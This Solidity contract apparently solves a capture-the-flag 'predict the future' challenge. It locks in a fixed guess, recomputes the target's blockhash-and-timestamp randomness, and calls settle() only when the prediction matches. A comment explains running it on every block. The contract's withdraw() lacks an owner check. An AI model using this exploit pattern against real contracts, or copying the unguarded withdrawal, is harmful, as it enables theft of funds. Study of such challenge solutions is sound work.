pragma solidity ^0.8.13;


contract Predictor {

    address owner;
    address challenge;

    uint8 numberToGuess = 6;

    constructor(address _challenge) {
        owner = msg.sender;
        challenge = _challenge;
    }

    function getNumber() public view returns (uint8) {
        bytes memory payload = abi.encodePacked(blockhash(block.number - 1), block.timestamp);
        return uint8(uint(keccak256(payload))) % 10;
    }

     function lockNumber() public payable returns(bool){

         require(msg.value == 1 ether, "Value is not enough");
         bytes4 payload = bytes4(keccak256(("lockInGuess(uint8)")));
         challenge.call{value: 1 ether}(abi.encodeWithSelector(payload, numberToGuess));

         return true;
     }

    function solveChallenge() public {

        uint8 newNumber = getNumber();

        require(numberToGuess == newNumber, "Numbers are not not equal");

        bytes4 selector = bytes4(keccak256("settle()"));
        bytes memory payload = abi.encodeWithSelector(selector);
        challenge.call{value: address(this).balance}(payload);

    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    } 

    receive() external payable {}

}


/*
    A number is locked in, with an address and a block number
    To guess the number: the sender addres should match the one that locked
    the number just after 2 block one can predict the number.

    In order to solve this problem:

     + a contract should be the one locking the number so that the sender address is the one from the caller
     + a function should call a wrapper function to determine if feasible the prediction of n
     + to make things easier a script should run the wrapper function every time a block is added in order to predict the future

     + this same strategy could be used to recapture the ehter that got stuck within the contract
*/
